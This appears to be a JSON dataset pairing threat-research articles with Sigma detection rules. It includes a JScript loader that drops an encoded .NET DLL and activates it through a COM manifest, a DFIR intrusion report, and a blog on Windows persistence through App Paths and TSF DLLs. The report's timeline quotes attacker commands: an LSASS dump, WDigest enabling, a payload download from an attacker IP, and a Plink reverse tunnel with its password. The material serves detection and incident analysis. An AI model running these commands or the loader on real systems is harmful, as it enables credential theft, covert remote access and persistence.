JpYnV0ZQBJbnRlcmZhY2VUeXBlQXR0cmlidXRlAENvbUludGVyZmFjZVR5cGUAR3VpZEF0dHJpYnV0ZQBTeXN0ZW0AR3VpZABNYXJzaGFsQnlSZWZPYmplY3QAQ2xhc3NJbnRlcmZhY2VBdHRyaWJ1dGUAQ2xhc3NJbnRlcmZhY2VUeXBlAFByb2dJZEF0dHJpYnV0ZQBTdHJpbmcAb3BfRXF1YWxpdHkAU3lzdGVtLldpbmRvd3MuRm9ybXMARGlhbG9nUmVzdWx0AE1lc3NhZ2VCb3gAU2hvdwBJbnRQdHIAWmVybwBQYXJzZQBDb21wYXJlVG8ATWFyc2hhbABHZXRJVW5rbm93bkZvck9iamVjdABRdWVyeUludGVyZmFjZQBPYmplY3QAQXBwRG9tYWluU2V0dXAAU3lzdGVtLlNlY3VyaXR5LlBvbGljeQBFdmlkZW5jZQBBcHBEb21haW4AVHlwZQBFbnZpcm9ubWVudABHZXRFbnZpcm9ubWVudFZhcmlhYmxlAHNldF9BcHBsaWNhdGlvbkJhc2UAZ2V0X0N1cnJlbnREb21haW4AZ2V0X0V2aWRlbmNlAENyZWF0ZURvbWFpbgBSdW50aW1lVHlwZUhhbmRsZQBHZXRUeXBlRnJvbUhhbmRsZQBTeXN0ZW0uUmVmbGVjdGlvbgBBc3NlbWJseQBnZXRfQXNzZW1ibHkAZ2V0X0Z1bGxOYW1lAENyZWF0ZUluc3RhbmNlQW5kVW53cmFwAGV4cG9ydC5kbGwAbXNjb3JsaWIASUR5bmFtaWNXcmFwcGVyRG90TmV0AElDbGFzc0ZhY3RvcnkARHluYW1pY1dyYXBwZXJEb3ROZXQAZ2V0VmFsdWUxAHNQYXJhbWV0ZXIAZ2V0VmFsdWUzAGdldFZhbHVlMgBDcmVhdGVJbnN0YW5jZQBwVW5rT3V0ZXIAcmlpZABwcHZPYmplY3QATG9ja1NlcnZlcgBmTG9jawBEbGxHZXRDbGFzc09iamVjdAByY2xzaWQAcHB2AGV4cG9ydAAAAAADYQAAA2IAAANjAAAZQQAgAHcAYQBzACAAYwBoAG8AcwBlAG4AABlCACAAdwBhAHMAIABjAGgAbwBzAGUAbgAAGUMAIAB3AGEAcwAgAGMAaABvAHMAZQBuAAALTwB0AGgAZQByAAAxRgByAG8AbQAgAF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\nbinaryWriter(dynwrapX,scriptdir+\"\\\\export.dll\");\n\n\n\n// You could add a way to drop this dynamically \t\nvar manifest = '<?xml version=\"1.0\" encoding=\"UTF-16\" standalone=\"yes\"?> <assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"> \t<assemblyIdentity type=\"win32\" name=\"Export\" version=\"0.0.0.0\"/> \t<file name=\"Export.dll\"> \t<comClass  description=\"Export Class\" clsid=\"{185FAAFF-9A8A-41B4-809A-CA6EEAA95D61}\" threadingModel=\"Both\" progid=\"DynamicWrapperDotNet\"/> \t</file>  </assembly>';\nvar ax = new ActiveXObject(\"Microsoft.Windows.ActCtx\");\nax.ManifestText = manifest;\t\n\nvar mdo = ax.CreateObject(\"DynamicWrapperDotNet\");\nvar s = mdo.getValue1(\"a\");\nWScript.StdOut.WriteLine(s);\nvar t = mdo.getValue1(\"b\");\nvar s = mdo.getValue2();\nmdo.getValue3();\nWScript.StdOut.WriteLine(s);\nWScript.StdOut.WriteLine(t);\n```",
    "sigma_rule": {
      "title": "Suspicious DotNET CLR Usage Log Artifact",
      "id": "e0b06658-7d1d-4cd3-bf15-03467507ff7c",
      "related": [
        {
          "id": "4508a70e-97ef-4300-b62b-ff27992990ea",
          "type": "derived"
        },
        {
          "id": "e4b63079-6198-405c-abd7-3fe8b0ce3263",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the creation of Usage Log files by the CLR (clr.dll). These files are named after the executing process once the assembly is finished executing for the first time in the (user) session context.",
      "references": [
        "https://bohops.com/2021/03/16/investigating-net-clr-usage-log-tampering-techniques-for-edr-evasion/",
        "https://github.com/olafhartong/sysmon-modular/blob/fa1ae53132403d262be2bbd7f17ceea7e15e8c78/11_file_create/include_dotnet.xml",
        "https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008",
        "https://web.archive.org/web/20230329154538/https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html"
      ],
      "author": "frack113, omkar72, oscd.community, Wojciech Lesicki",
      "date": "2022-11-18",
      "modified": "2023-02-23",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows",
        "definition": "Requirements: UsageLogs folder must be monitored by the sysmon configuration"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            "\\UsageLogs\\cmstp.exe.log",
            "\\UsageLogs\\cscript.exe.log",
            "\\UsageLogs\\mshta.exe.log",
            "\\UsageLogs\\msxsl.exe.log",
            "\\UsageLogs\\regsvr32.exe.log",
            "\\UsageLogs\\rundll32.exe.log",
            "\\UsageLogs\\svchost.exe.log",
            "\\UsageLogs\\wscript.exe.log",
            "\\UsageLogs\\wmic.exe.log"
          ]
        },
        "filter_main_rundll32": {
          "ParentImage|endswith": "\\MsiExec.exe",
          "ParentCommandLine|contains": " -Embedding",
          "Image|endswith": "\\rundll32.exe",
          "CommandLine|contains|all": [
            "Temp",
            "zzzzInvokeManagedCustomActionOutOfProc"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Rundll32.exe with zzzzInvokeManagedCustomActionOutOfProc in command line and msiexec.exe as parent process - https://twitter.com/SBousseaden/status/1388064061087260675"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_net_cli_artefact.yml"
  },
  "17": {
    "url": "https://thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/",
    "markdown": "# Will the Real Msiexec Please Stand Up? Exploit Leads to Data Exfiltration\n\n**Published on:** June 6, 2022\n\n## Introduction\n\nIn this multi-day intrusion, we observed a threat actor gain initial access to an organization by exploiting a vulnerability in ManageEngine SupportCenter Plus. The threat actor discovered files on the server, dumped credentials using a web shell, moved laterally to key servers using Plink and RDP, and exfiltrated sensitive information using the web shell and RDP.\n\nThe FBI and CISA published an advisory noting that APT attackers were using CVE-2021-44077 to gain initial access to the networks of organizations in Critical Infrastructure Sectors such as healthcare, financial, electronics, and IT consulting industries.\n\n---\n\n## Case Summary\n\nThe intrusion began with the exploitation of an internet-facing instance of ManageEngine SupportCenter Plus via the CVE-2021-44077 vulnerability. The threat actor successfully exploited the RCE vulnerability in SupportCenter Plus, which allowed them to drop a web shell in an internet-accessible directory. The exploit observed was similar to a publicly available POC exploit on GitHub.\n\nThe threat actor performed generic enumeration of the system and enabled WDigest authentication on the server using the web shell. Enumeration included querying network configuration, a list of domain-joined computers, user and OS information, and current user sessions on the beachhead.\n\nOver several days, the threat actor periodically returned to check logged-in users on the beachhead server using the web shell. On the seventh day, the threat actor performed an LSASS dump, capturing the credentials of an administrative user who had recently logged in. WDigest authentication enabled earlier allowed access to plaintext credentials.\n\nThe following day, the threat actor downloaded `ekern.exe`, a renamed version of Plink, and deployed a script to establish a reverse SSH connection to the RDP port of the beachhead server. An interactive RDP session was successfully established, enabling the threat actor to enumerate other computers on the network.\n\nFrom the beachhead, lateral movement was conducted to three other servers via RDP, including a domain controller, a file server, and another server. Confidential files were exfiltrated throughout the intrusion using a mixture of web shell access and hands-on keyboard access via RDP.\n\nThe exfiltrated files were critical to the business and its partner. The documents were selectively chosen, indicating the attackers were searching for specific material. One folder of utmost importance was exfiltrated while other partner folders and files were ignored. Internal machine certificates were also reviewed and later exfiltrated. The exfiltrated information has not been found in any public dumps or sales to date.\n\nThe threat actors were evicted from the network soon after stealing this information.\n\n---\n\n## Services\n\nWe offer multiple services, including a Threat Feed service that tracks Command and Control frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\n---\n\n## Timeline\n\n```image\nAlt: Timeline\nDescription: The image is a detailed timeline illustrating a sequence of events related to a cyber exploit involving the ManageEngine software, categorized by days. It outlines specific activities that occurred over multiple days, including timestamped actions such as session enumeration, user discovery, and data exfiltration methods employed by a threat actor. The timeline includes commands executed during the exploit, showcasing the technical intricacies of the attack.\nTranscription: |\n  Will the Real Msiexec Please Stand Up?  \n  Exploit Leads to Data Exfiltration\n  \n  Day 1\n  20:04 UTC ManageEngine Exploit via CVE-2021-44077\n  msiexec.exe /i Site24x7WindowsAgent.msi EDITAL=asdasd /qn\n  Webshell dropped to C:\\Program Files\\ManageEngine\\SupportCenterPlus\\custom\\ login\\fm2.jsp\n  \n  20:11 UTC First Discovery Activity via Web Shell\n  ipconfig /all\n  \n  20:40 UTC Session Enumeration on Beachhead\n  quser\n  query session\n  \n  20:41 UTC Enable WDigest Authentication on Beachhead\n  reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential\n  powershell.exe Set-ItemProperty -Force -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -Name 'UseLogonCredential' -Value '1'\n  \n  20:43 UTC Final Discovery of First Day\n  systeminfo\n  \n  Day 3\n  20:25 UTC Session Enumeration on Beachhead\n  query session\n  quser\n  \n  Day 7\n  22:31 UTC Session Enumeration on Beachhead\n  tasklist\n  quser\n  \n  22:33 UTC LSASS Dump on Beachhead\n  rundll32.exe C:\\windows\\System32\\comsvcs.dll MiniDump 640 C:\\windows\\temp\\logctl.zip\n  \n  22:37 UTC User Enumeration and Evidence Removal on Beachhead\n  net user REDACTED /domain\n  powershell.exe del c:\\windows\\temp\\logctl.zip\n  \n  Day 8\n  17:21 UTC Discovery\n  wmic computersystem get domain\n  \n  17:31 UTC Reverse SSH Tunnel for RDP Access Established on Beachhead\n  powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://23.81.246.84/file.exe', 'C:\\windows\\temp\\ekern.exe')\n  C:\\windows\\temp\\ekern.exe -ssh -P 443 -l admin -pw Asde34854$435dfPVDfC -R 23.81.246.84:49400:127.0.0.1:3389 23.81.246.84\n  \n  17:43 UTC Lateral Movement to File server via RDP\n  Task Manager opened via RDP Session\n  \n  18:33 UTC Lateral Movement to Domain Controller via RDP\n  Task Manager opened via RDP Session\n  Certificate file examined via RDP Session\n  \n  20:12 UTC Canary Token Hit\n  8.0.26.137\n  \n  19:59 UTC Canary Token Hit\n  192.221.154.141\n```\n\n---\n\n## Report Lead\n\n- **Lead Analyst:** @iiamaleks\n- **Contributing Analysts:** @svch0st & @v3t0_\n\n---\n\n## Indicators\n\n### Atomic\n\n- **SSH Reverse Proxy:** `23.81.246.84`\n- **Webshell Query IPs:**\n  - `5.239.37.78`\n  - `5.114.3.200`\n  - `5.113.111.4`\n  - `35.196.132.85`\n- **ManageEngine Exploit Origin:**\n  - `2.58.56.14`\n  - `185.220.101.76`\n- **Canary Document Alert IPs:**\n  - `8.0.26.137`\n  - `192.221.154.141`\n\n### Computed\n\n- **Webshell (`fm2.jsp`):**\n  - MD5: `05cee9b71bdd99c22dde19957a6169e7`\n  - SHA1: `a188d7283c2b4744c4e91f18c59588c8471a2a86`\n  - SHA256: `8703f52c56b3164ae0becfc5a81bfda600db9aa6d0f048767a9684671ad5899b`\n- **Batch Script (`FXS.bat`):**\n  - MD5: `03cbb2227284c4842906d3576372e604`\n  - SHA1: `8aeb24b51b339446cac2cb0a4c93ad98f709cf53`\n  - SHA256: `6e5289df8be0403eda9f63f14c3b3c753a11e924e00484958166d03fcf922510`\n- **Plink (`ekern.exe`):**\n  - MD5: `848f7edb825813aee4c09c7f2ec71d27`\n  - SHA1: `4709827c7a95012ab970bf651ed5183083366c79`\n  - SHA256: `828e81aa16b2851561fff6d3127663ea2d1d68571f06cbd732fdf5672086924d`\n\n---\n\n## MITRE Techniques\n\n- **T1190:** Exploit Public-Facing Application\n- **T1572:** Protocol Tunneling\n- **T1003:** OS Credential Dumping\n- **T1059.001:** Command and Scripting Interpreter: PowerShell\n- **T1505.003:** Server Software Component: Web Shell\n- **T1070.004:** File Deletion\n- **T1036:** Masquerading\n- **T1112:** Modify Registry\n- **T1021.001:** Remote Services: Remote Desktop Protocol\n- **T1087:** Account Discovery\n- **T1057:** Process Discovery\n- **T1012:** Query Registry",
    "sigma_rule": {
      "title": "Renamed Plink Execution",
      "id": "1c12727d-02bf-45ff-a9f3-d49806a3cf43",
      "status": "test",
      "description": "Detects the execution of a renamed version of the Plink binary",
      "references": [
        "https://thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/",
        "https://the.earth.li/~sgtatham/putty/0.58/htmldoc/Chapter7.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-06",
      "modified": "2023-02-03",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "OriginalFileName": "Plink"
          },
          {
            "CommandLine|contains|all": [
              " -l forward",
              " -P ",
              " -R "
            ]
          }
        ],
        "filter": {
          "Image|endswith": "\\plink.exe"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_renamed_plink.yml"
  },
  "18": {
    "url": "http://www.hexacorn.com/blog/2013/01/19/beyond-good-ol-run-key-part-3/",
    "markdown": "# Beyond good ol’ Run key, Part 3\n\nPosted on 2013-01-19\n\nPossible Autostart/start mechanisms that are built-in ‘natively’ in Windows and also available by means of extra features offered by many applications go beyond typical path locations and registry keys highlighted by popular programs and scripts like Autoruns and SilentRunners. I have covered some of the non-standard persistence techniques in 2 older posts in the series here and here, but as usual – there is always more to write about.\n\nIn this post I will cover another batch of less known and possibly ‘obscure’ technique that could be potentially used for autostart/start purposes. I write ‘obscure’, because it is not a typical way of doing autostart, but let’s be honest – there is nothing really extraordinary about it – just a simple abuse of built-in features in both OS and applications.\n\n### Code-in-the-middle proxy\n\nLong story short, it is a well known fact that many existing registry entries and files pointing to or containing code can be modified to introduce a code-in-the-middle proxy (DLL, EXE, etc.) that will be executed/loaded first instead of a legitimate entry. The original entries are preserved so that they can be transparently executed/loaded once malware is running. There are many existing examples of this technique already being used e.g. hijacks of Shell Open Command, Image File Execution Options, etc., but it is important to remember that this technique can be extended literally to any registry key or file that is loaded either during autostart or often used by users.\n\n### Application Registration (App Paths) hijacking\n\nAnother proxy technique that could be used to hijack popular applications relies on registry entries stored under the following key:\n\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\n```\n\nAs per Microsoft:\n\nThe entries found under App Paths are used primarily for the following purposes:\n\n- To map an application’s executable file name to that file’s fully qualified path.\n- To pre-pend information to the PATH environment variable on a per-application, per-process basis.\n\nA legitimate entry that can be found on many newer versions of Windows is shown below:\n\n```image\nAlt: apppaths1\nDescription: The image is a screenshot of the Windows Registry Editor, displaying the registry key path 'HKEY_LOCAL_MACHINE\\\nTranscription: |\n  Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\pbrush.exe\n  \n  Name         Type             Data\n  (Default)    REG_EXPAND_SZ    %SystemRoot%\\System32\\mspaint.exe\n  Path         REG_EXPAND_SZ    %SystemRoot%\\System32\n```\n\nIt is responsible for launching MS Paint program when someone tries to run it using a legacy ‘pbrush.exe’ name.\n\nOne could add a modification for e.g. calc.exe:\n\n```image\nAlt: apppaths2\nDescription: The image is a screenshot of the Windows Registry Editor, displaying the registry key for the application path associated with 'calc.exe'. It shows the entry for 'calc.exe' pointing to 'notepad.exe' located in 'c:\\windows\\system32\\'. This illustrates how registry modifications can hijack application paths, redirecting the launch of the calculator to the Notepad application instead.\nTranscription: |\n  Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\calc.exe\n  \n  Name         Type      Data\n  (Default)    REG_SZ    c:\\windows\\system32\\notepad.exe\n```\n\nFrom now on, anytime someone tries to run calc.exe manually (e.g. via Start Menu/Run window), Notepad will be launched. It may not be a main persistence mechanism, but could be used for re-infection purposes on systems that have been cleaned up, but not rebuilt.\n\nYou can test it (XP needed) by downloading this reg file, then applying it to your Registry and then launching Win+R and typing ‘calc’ or ‘calc.exe’ and hitting enter. Note: It doesn’t work from command line (a mistake in an older version of this post which I correct here).\n\n### Text Services (TSF)\n\nMicrosoft defines Text Services as:\n\nMicrosoft Windows Text Services Framework (TSF) is a system service available as a redistributable for Windows 2000. TSF provides a simple and scalable framework for the delivery of advanced text input and natural language technologies. TSF can be enabled in applications, or as a TSF text service. A TSF text service provides multilingual support and delivers text services such as keyboard processors, handwriting recognition, and speech recognition.\n\nFrom a practical point of view, TSF offers ways to extend available input methods by allowing to install support for languages that are not natively supported by Windows. A good example of such extension is Ekaya – an extension for a Myanmar (Burmese) language.\n\nIn order for TSF to work on Windows XP, one has to enable the ‘Extended support of advanced text services to all programs’:\n\n```image\nAlt: TextService-Step01.4\nDescription: The image is a screenshot from the Windows operating system, specifically the 'Text Services and Input Languages' settings menu. It displays options related to compatibility configuration for advanced text services. The checkbox for 'Extend support of advanced text services to all programs' is checked, indicating that advanced text services will be enabled for applications like Notepad. Below this, there's a note about the system configuration option to 'Turn off advanced text services' which is unchecked. The window includes buttons for 'OK', 'Cancel', and 'Apply'.\nTranscription: |\n  Text Services and Input Languages\n  \n  Settings       Advanced\n  \n  Compatibility Configuration\n  [✓] Extend support of advanced text services to all programs\n  Select this check box to turn on advanced text services in Notepad and other programs that do not normally support speech and handwriting recognition or other advanced input services.\n  \n  System Configuration\n  [ ] Turn off advanced text services\n  Select this check box to turn off advanced text services in all programs. Not recommended for East Asian users because this closes the language bar.\n  \n  [OK] [Cancel] [Apply]\n```\n\nOn Windows 7, it is enabled by default (but to install a TSF DLL one requires administrator privileges).\n\nExamples on how to use TSF are provided in Microsoft SDK (look for ‘Samples\\winui\\Input\\tsf\\TextService’ directory). For the purpose of this article, I just picked up the simplest possible example i.e. a project from the ‘Samples\\winui\\Input\\tsf\\TextService\\TextService-Step01’ subdirectory and updated it with a trivial cosmetic change – a call to OutputDebugString so that we can observe processes loading and unloading our test DLL.\n\n```\nBOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID pvReserved)\n{\n    TCHAR szFileFullPath[256];\n    TCHAR buf[300];\n    switch (dwReason)\n    {\n        case DLL_PROCESS_ATTACH:\n            g_hInst = hInstance;\n            GetModuleFileName (NULL,szFileFullPath,256);\n            _tcscpy (buf, TEXT(\"TSF DLL loaded: \"));\n            _tcscat (buf, szFileFullPath);\n            OutputDebugString(buf);\n            if (!InitializeCriticalSectionAndSpinCount(&g_cs, 0))\n                return FALSE;\n            break;\n\n        case DLL_PROCESS_DETACH:\n            GetModuleFileName (NULL,szFileFullPath,256);\n            _tcscpy (buf, TEXT(\"TSF DLL unloaded: \"));\n            _tcscat (buf, szFileFullPath);\n            OutputDebugString(buf);\n            DeleteCriticalSection(&g_cs);\n            break;\n    }\n    return TRUE;\n}\n```\n\nOnce registered with Regsrv32.exe:\n\n```\nregsvr32 TextService-Step01.dll\n```\n\n```image\nAlt: TextService-Step01.1\nDescription: The image displays a message box from the RegSvr32 utility in Windows, indicating that the registration of the DLL file 'TextService-Step01.dll' was successful. The message is contained within a dialog window featuring an information icon and a single 'OK' button, which allows the user to confirm the message and close the dialog.\nTranscription: |\n  RegSvr32\n  \n  DLLRegisterServer in TextService-Step01.dll succeeded.\n  \n  [OK]\n```\n\nthe DLL is now active and it will now be loaded to each new process utilizing Text Services (pretty much every single GUI application, including these already running) as can be shown via DebugView from Sysinternals.\n\nRunning a few test applications shows the following output in DebugView:\n\n```image\nAlt: TextService-Step01.2\nDescription: The image displays a DebugView output showing a log of events related to the loading and unloading of a TSF (Text Services Framework) DLL in a Windows environment. The log includes timestamps, the process in which the DLL was loaded or unloaded, and the specific executable files associated with these actions. This information is critical for understanding the behavior and lifecycle of the TSF DLL in relation to various applications on the system.\nTranscription: |\n  #    Time           Debug Print\n  0    0.00000000     [3480] TSF DLL loaded: C:\\WINDOWS\\system32\\regsvr32.exe\n  1    0.94201440     [3480] TSF DLL unloaded: C:\\WINDOWS\\system32\\regsvr32.exe\n  2    11.72093868    [2624] TSF DLL loaded: C:\\WINDOWS\\system32\\notepad.exe\n  3    15.40614605    [2624] TSF DLL unloaded: C:\\WINDOWS\\Explorer.EXE\n  4    15.22678516    [2644] TSF DLL loaded: C:\\WINDOWS\\Explorer.EXE\n  5    16.27532196    [3296] TSF DLL unloaded: C:\\WINDOWS\\system32\\calc.exe\n  6    18.75525739    [3296] TSF DLL unloaded: C:\\WINDOWS\\system32\\calc.exe\n  7    25.77335167    [3576] TSF DLL loaded: C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE\n  8    28.00389693    [3576] TSF DLL unloaded: C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE\n```\n\nOf course, it survives the reboot and is loaded next time user logs on and applications are executed + it works under Windows 7 without any problem:\n\n```image\nAlt: TextService-Step01.5\nDescription: The image displays a console window showing a log of debug output related to a TSF (Text Services Framework) DLL. It lists events with timestamps indicating when the TSF DLL was loaded and unloaded by various processes, including 'regsvr32.exe', 'calc.exe', and 'notepad.exe'. Each entry provides a time, process ID, and a message indicating the action (loaded or unloaded) that occurred with the TSF DLL.\nTranscription: |\n  #    Time           Debug Print\n  1    0.00000000     [2508] TSF DLL loaded: C:\\Windows\\SysWOW64\\regsvr32.exe\n  2    2.12864447     [2508] TSF DLL unloaded: C:\\Windows\\SysWOW64\\regsvr32.exe\n  3    3.85741568     [336] TSF DLL loaded: C:\\Users\\someguy\\Desktop\\dv.exe\n  4    88.90030670    [1380] TSF DLL loaded: C:\\Windows\\SysWOW64\\calc.exe\n  5    90.92218018    [1380] TSF DLL unloaded: C:\\Windows\\SysWOW64\\calc.exe\n  6    98.02786255    [840] TSF DLL loaded: C:\\Windows\\SysWOW64\\notepad.exe\n  7    99.93174744    [840] TSF DLL unloaded: C:\\Windows\\SysWOW64\\notepad.exe\n```\n\nYou may be wondering if there is any visual indication of the DLL being present on the system.\n\nThere is.\n\nIf you look at the legitimate software like aforementioned Ekaya – it adds a set of icons to the Language Bar:\n\n```image\nAlt: Ekaya1\nDescription: The image displays a screenshot of a Windows language input method menu, showing options for language selection. The highlighted option is 'Ekaya Input Method', which is designed for the Myanmar (Burmese) language, alongside 'English (United States)' as another choice. This menu is part of the functionality provided by the Microsoft Text Services Framework (TSF), indicating that the Ekaya input method is active and available for use in the system.\nTranscription: |\n  Ekaya Input Method\n  ✔ English (United States)\n  Show the Language bar\n```\n\nand\n\n```image\nAlt: Ekaya2\nDescription: The image shows a screenshot of a Windows taskbar with a language bar icon. The icon displays options related to a specific text service, labeled 'my-Win 2.3.3 Unicode 5.2'. A dropdown menu is visible, indicating that users can access a help option. This image serves to illustrate the visual representation of the installed TSF (Text Services Framework) DLL and its integration into the Windows operating system's language settings.\nTranscription: |\n  Help\n  my-Win 2.3.3 Unicode 5.2\n```\n\nIt can be also seen in Text Services and Input Languages section (you can find it under Regional Settings):\n\n```image\nAlt: Ekaya3\nDescription: The image shows the 'Text Services and Input Languages' settings window in Windows XP. It displays options for selecting the default input language, listing installed services, and providing buttons for modification (Add, Remove, Properties). The 'Ekaya Input Method' is highlighted as part of the installed services, indicating support for the Burmese language.\nTranscription: |\n  Text Services and Input Languages\n  \n  Default input language\n  Select one of the installed input languages to use when you start your computer.\n  English (United States) - US\n  \n  Installed services\n  Select the services that you want for each input language shown in the list. Use the Add and Remove buttons to modify this list.\n  EN English (United States)\n      Keyboard\n      Ekaya Input Method\n      US\n  \n  Preferences\n  Language Bar...   Key Settings...\n  OK   Cancel   Apply\n```\n\nThere is no requirement for TSF DLLs to add extra features to the Language Bar, so the Text Services and Input Languages section under Regional Settings is the only place where it is possible to spot the loaded DLL – for our test sample it looks like this:\n\n```image\nAlt: TextService-Step01.3\nDescription: The image shows a Windows dialog box for 'Text Services and Input Languages'. It displays the 'Settings' and 'Advanced' tabs, with a list of installed input languages. The default input language is set to 'English (United States) - US', and under 'Installed services', it lists 'Advanced Text Services' and a 'Sample Text Service' alongside the standard 'US Keyboard'. The layout includes buttons for 'Add...', 'Remove...', and 'Properties...', along with 'Language Bar...' and 'Key Settings...' options.\nTranscription: |\n  Text Services and Input Languages\n  \n  Default input language\n  Select one of the installed input languages to use when you start your computer.\n  English (United States) - US\n  \n  Installed services\n  Select the services that you want for each input language shown in the list. Use the Add and Remove buttons to modify this list.\n  EN English (United States)\n     - Advanced Text Services\n     - Sample Text Service\n     - Keyboard\n     - US\n  \n  Preferences\n  [Language Bar...] [Key Settings...]\n  [OK] [Cancel] [Apply]\n```\n\n### DLL load order\n\nThis is a trick relying on DLL load order – it has been covered on many security blogs in last 2 years so I just mention it for completeness – there are many DLLs that can be ‘injected’ into a loading process of many popular programs. Two of them: **fxsst.dll** and **ntshrui.dll** have been covered by Nick Harbour from Mandiant in his posts from July 2010 and June 2011.\n\n### IIS Server Extensions (ISAPI filters)\n\nIn my older post I mentioned plugins and various extensions that can be loaded into various applications. There are really a lot of possibilities here, including multum of popular software, Windows Shell extensions, aforementioned Text services, IME, URL handlers, and so on and so forth. There are also possibilities of writing server environment-specific extensions e.g. ISAPI filters:\n\nAs per the information on the 